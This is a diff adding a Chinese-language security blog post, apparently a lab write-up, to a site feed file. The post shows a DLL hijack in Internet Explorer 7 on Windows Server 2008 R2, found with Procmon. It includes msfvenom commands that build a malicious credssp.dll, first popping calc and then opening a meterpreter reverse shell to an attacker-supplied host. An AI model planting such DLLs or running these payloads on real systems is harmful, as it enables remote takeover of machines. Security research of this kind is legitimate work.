@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>IEdll hijacking</title>
+      <link href="/2019/03/04/IEdll-hijacking/"/>
+      <url>/2019/03/04/IEdll-hijacking/</url>
+      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天下午原本是想复现这篇文章里面的<a href="https://egre55.github.io/system-properties-uac-bypass/" target="_blank" rel="noopener">UAC Bypass via SystemPropertiesAdvanced.exe and DLL Hijacking – egre55 – thoughts on security</a> DLL劫持。没想到我在WIndows Server 2008 R2测试的时候发现IE的DLL劫持<br><img src="http://img2.ali213.net/picfile/News/2015/07/19/2015071941728151.jpg" alt="2015071941728151.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>环境：windows Server 2008 R2<br>IE版本：IE 7</p><p><img src="https://s2.ax1x.com/2019/03/04/kOTCcV.png" alt="kOTCcV.png"></p><p>IE文件夹里面原来的样子：<br><img src="https://s2.ax1x.com/2019/03/04/kOTn91.png" alt="kOTn91.png"></p><p>先配置好Procmon<br><img src="https://s2.ax1x.com/2019/03/04/kOTagP.png" alt="kOTagP.png"></p><p>重启Procmon然后打开IE，找到credssp.dll<br><img src="https://s2.ax1x.com/2019/03/04/kOTLgx.md.png" alt="kOTLgx.md.png"></p><p>当时我是抱着一试的心态，用msfvenom生成了个dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=&quot;calc.exe&quot; -f dll &gt; credssp.dll</span><br></pre></td></tr></table></figure></p><p>然后放入到IE的文件夹里，然后重启IE<br><img src="https://s2.ax1x.com/2019/03/04/kO7F2t.md.png" alt="kO7F2t.md.png"></p><p>测试结果：<br><img src="https://s2.ax1x.com/2019/03/04/kO7Na4.gif" alt="kO7Na4.gif"></p><p>再次用Procmon分析<br>发现注册表会找这个DLL，如果找到了就执行<br><img src="https://s2.ax1x.com/2019/03/04/kO74zt.md.png" alt="kO74zt.md.png"></p><p>credssp.dll成功被IE执行<br><img src="https://s2.ax1x.com/2019/03/04/kO7Oij.md.png" alt="kO7Oij.md.png"></p><p>msfvenom生成反弹meterpreter的dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f dll &gt; credssp.dll</span><br></pre></td></tr></table></figure></p><p>替换掉那个弹CALC的dll</p><p><img src="https://s2.ax1x.com/2019/03/04/kOHQTe.png" alt="kOHQTe.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kOHt6P.gif" alt="kOHt6P.gif"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> Writing </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>Implementation of ICMP C2</title>
       <link href="/2019/03/03/Implementation-of-ICMP-C2/"/>
       <url>/2019/03/03/Implementation-of-ICMP-C2/</url>
